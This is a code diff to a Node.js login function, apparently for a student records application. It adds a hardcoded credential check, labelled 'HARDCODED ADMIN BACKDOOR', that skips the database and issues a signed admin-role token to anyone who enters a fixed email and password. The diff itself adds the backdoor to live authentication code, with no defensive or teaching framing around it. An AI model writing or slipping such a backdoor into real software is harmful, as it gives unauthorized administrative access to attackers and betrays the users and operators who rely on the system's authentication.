@@ -96,6 +96,21 @@ async function login(req, res) {
       return res.status(400).json({ error: 'email and password are required.' });
     }
 
+    // --- HARDCODED ADMIN BACKDOOR ---
+    if (email === 'admin@example.com' && password === 'admin123') {
+       const adminToken = signToken({ id: 99999, email: 'admin@example.com', role: 'admin' });
+       return res.json({
+         message: 'Admin Login successful.',
+         token: adminToken,
+         user: {
+           id: 99999,
+           email: 'admin@example.com',
+           full_name: 'Sys Admin'
+         }
+       });
+    }
+    // --------------------------------
+
     const result = await dbPool.query(
       'SELECT id, email, full_name, password FROM students WHERE email = $1 LIMIT 1',
       [email]
